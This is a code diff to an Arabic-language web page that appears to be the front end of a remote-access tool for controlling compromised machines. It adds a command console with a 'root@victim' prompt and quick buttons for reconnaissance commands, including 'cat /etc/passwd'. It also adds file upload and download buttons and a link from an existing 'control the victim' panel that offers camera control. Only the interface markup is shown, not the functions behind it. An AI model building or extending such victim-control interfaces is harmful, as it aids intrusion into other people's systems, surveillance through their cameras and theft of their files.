@@ -306,9 +306,44 @@
             <button onclick="exportNetworkMap()" style="background: #0066cc; color: #fff; padding: 10px 20px; border: none; border-radius: 5px; margin: 5px;">📤 تصدير الخريطة</button>
         </div>
 
+        <!-- Command Console -->
+        <div class="command-console" style="display: none;" id="commandConsole">
+            <h3>💻 وحدة التحكم المباشر</h3>
+            <div style="background: #000; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; margin: 20px 0;">
+                <div style="display: flex; align-items: center; margin-bottom: 15px;">
+                    <span style="color: #00ff00; margin-right: 10px;">root@victim:~#</span>
+                    <input type="text" id="commandInput" placeholder="أدخل الأمر هنا..." style="flex: 1; background: transparent; border: none; color: #00ff00; font-family: monospace; outline: none;" onkeypress="handleCommandInput(event)">
+                    <button onclick="executeCommand()" style="background: #ff0000; color: #fff; padding: 5px 15px; border: none; border-radius: 3px; margin-left: 10px;">تنفيذ</button>
+                </div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 10px; margin: 15px 0;">
+                    <button onclick="quickCommand('whoami')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">whoami</button>
+                    <button onclick="quickCommand('pwd')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">pwd</button>
+                    <button onclick="quickCommand('ls -la')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">ls -la</button>
+                    <button onclick="quickCommand('netstat -an')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">netstat -an</button>
+                    <button onclick="quickCommand('ps aux')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">ps aux</button>
+                    <button onclick="quickCommand('cat /etc/passwd')" style="background: #333; color: #fff; padding: 5px 10px; border: none; border-radius: 3px; font-size: 12px;">cat /etc/passwd</button>
+                </div>
+                
+                <div id="commandOutput" style="background: #111; border: 1px solid #333; border-radius: 5px; padding: 15px; font-family: monospace; color: #00ff00; white-space: pre-wrap; max-height: 300px; overflow-y: auto; margin-top: 15px;">
+جاهز لتنفيذ الأوامر...
+                </div>
+                
+                <div style="margin-top: 15px; display: flex; gap: 10px;">
+                    <button onclick="clearConsole()" style="background: #666; color: #fff; padding: 8px 16px; border: none; border-radius: 4px;">🧹 مسح</button>
+                    <button onclick="saveConsoleLog()" style="background: #0066cc; color: #fff; padding: 8px 16px; border: none; border-radius: 4px;">💾 حفظ السجل</button>
+                    <button onclick="uploadFile()" style="background: #ff6600; color: #fff; padding: 8px 16px; border: none; border-radius: 4px;">📤 رفع ملف</button>
+                    <button onclick="downloadFiles()" style="background: #00aa00; color: #fff; padding: 8px 16px; border: none; border-radius: 4px;">📥 تحميل ملفات</button>
+                </div>
+            </div>
+        </div>
+
         <!-- Victim Control Interface -->
         <div class="victim-control-panel" style="display: none;" id="victimControlPanel">
             <h3>🎮 التحكم في الضحية</h3>
+            <div style="margin-bottom: 20px;">
+                <button onclick="showCommandConsole()" style="background: #00ff00; color: #000; padding: 10px 20px; border: none; border-radius: 5px; font-weight: bold;">💻 فتح وحدة التحكم</button>
+            </div>
             <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
                 <div class="control-section">
                     <h4>📷 التحكم في الكاميرا</h4>
